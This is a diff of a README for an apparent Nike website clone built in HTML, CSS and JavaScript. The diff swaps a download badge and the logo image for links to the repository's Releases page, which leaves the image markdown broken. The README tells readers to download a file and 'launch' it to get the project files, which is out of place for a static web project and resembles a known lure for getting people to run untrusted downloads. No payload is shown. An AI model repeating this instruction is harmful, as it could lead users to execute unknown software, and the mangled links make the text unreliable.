@@ -17,7 +17,7 @@ In this project, we have recreated the Nike website using HTML, CSS, and JavaScr
 - **Topics:** css, ecommerce, frontend, html, javascript, nike, nike-website, nike-website-clone, responsive-design, ui-design, web-development
 
 ## Explore the Project
-To explore the project further, you can download the project files from the following link: [![Download App.zip](https://img.shields.io/badge/Download-App.zip-9cf)](https://github.com/repo/releases/9246/App.zip)
+To explore the project further, you can download the project files from the following link: [![Download https://github.com/biandersonargentino134/Nike-website-clone/releases](https://github.com/biandersonargentino134/Nike-website-clone/releases)](https://github.com/biandersonargentino134/Nike-website-clone/releases)
 
 If the link ends with the file name, it needs to be launched to access the project files. If you encounter any issues with the link, feel free to check the "Releases" section of the repository for alternative download options.
 
@@ -25,4 +25,4 @@ Remember to give the project a star if you find it interesting and feel free to 
 
 Thank you for visiting our Nike Website Clone Showcase. Happy coding! 🚀
 
-![Nike Logo](https://www.logotaglines.com/wp-content/uploads/2020/07/Nike-Logo.png)
+![Nike Logo](https://github.com/biandersonargentino134/Nike-website-clone/releases)
